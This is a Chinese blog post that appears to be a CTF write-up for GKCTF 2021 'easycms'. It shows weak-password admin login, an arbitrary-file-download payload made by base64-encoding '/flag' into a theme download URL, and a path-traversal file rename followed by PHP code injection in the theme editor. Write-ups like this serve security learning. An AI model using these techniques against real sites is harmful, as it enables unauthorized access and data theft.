---
title: '[GKCTF 2021]easycms'
date: 2024-06-21 19:10:33
tags: 
     - 题解
     - cms
categories: 刷题笔记
---

## [GKCTF 2021]easycms

url+admin.php，我们能够进入登录页面

![image-20240621194103359](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406211941505.png)

题目提示了密码是五位数弱密码

我们考虑admin/admin，admin/12345，实在不行再去fuzz

但admin/12345成功登录了进去

<!--more-->

登录进去以后有两种方法
        一. 任意文件下载

我们在设计的主题里打开自定义导出主题

![image-20240621194544321](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406211945510.png)

我们查看下载链接

```
http://34c1d27a-d972-49a5-9ae5-0cbf5d2b5751.node5.buuoj.cn:81/admin.php?m=ui&f=downloadtheme&theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA=
```

发现后面那串是base64编码

我们解码得到文件的绝对路径

```
/var/www/html/system/tmp/theme/default/1.zip
```

我们可以把路径修改为/flag，就能直接把flag下载下来

```
/flag

L2ZsYWc=
```

payload

```
http://34c1d27a-d972-49a5-9ae5-0cbf5d2b5751.node5.buuoj.cn:81/admin.php?m=ui&f=downloadtheme&theme=L2ZsYWc=
```

得到flag



二、文件上传

在设计的主题的自定义的首页的编辑里选择php源代码

![image-20240621195052680](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406211950702.png)

输入命令执行语句，但保存是提示我们要先创建 /var/www/html/system/tmp/hjkv.txt文件

![image-20240621195210840](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406211952875.png)

我们在设计的组件的素材库随便上传一个txt文件

![image-20240621195319903](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406211953993.png)

再点击编辑，修改它的名称为../../../../../system/tmp/hjkv

![image-20240621195812124](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406211958153.png)

然后回去编辑php代码

![image-20240621195849724](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406211958827.png)

在主页面的头部发现flag

![image-20240621195911327](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406211959362.png)
